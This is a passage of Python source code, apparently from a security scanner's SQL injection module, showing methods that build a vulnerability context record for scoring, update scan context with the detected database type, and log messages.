        data_modifiable = ["database"]
        
        # Determine authentication requirement
        # If we found it on a login page (auth bypass), then no auth required
        # For others, we assume False (public endpoint) unless we know otherwise
        requires_authentication = False 
        
        # Check for scope change indicators
        # Commands like xp_cmdshell would be scope changed, but standard SQLi is Unchanged
        escapes_security_boundary = False
        can_execute_os_commands = False
        
        # Specific context for auth bypass
        if is_auth_bypass:
            data_exposed.extend(["credentials", "user_data"])
            
        return VulnerabilityContext(
            vulnerability_type="sql_injection",
            detection_method=detection_method,
            endpoint=path,
            parameter=parameter,
            http_method=method,
            requires_authentication=requires_authentication,
            network_accessible=True,
            data_exposed=data_exposed,
            data_modifiable=data_modifiable,
            payload_succeeded=True,
            target_technology=db_type or "Unknown",
            escapes_security_boundary=escapes_security_boundary,
            can_execute_os_commands=can_execute_os_commands,
            additional_context={
                "db_type": db_type,
                "is_auth_bypass": is_auth_bypass
            }
        )

    def _update_scan_context(
            self,
            scan_context: Optional[Any],
            db_type: Optional[str],
            technique: str
    ) -> None:
        """Update scan context with discovered database information."""
        if scan_context and db_type:
            try:
                scan_context.set_database_info(
                    db_type=db_type,
                    discovered_by=f"sql_injection_{technique}"
                )
            except Exception:
                pass

    def log(self, message: str, level: str = "info") -> None:
        """Helper for consistent logging."""
        prefix = f"[SQL Agent]"
        print(f"{prefix} {message}")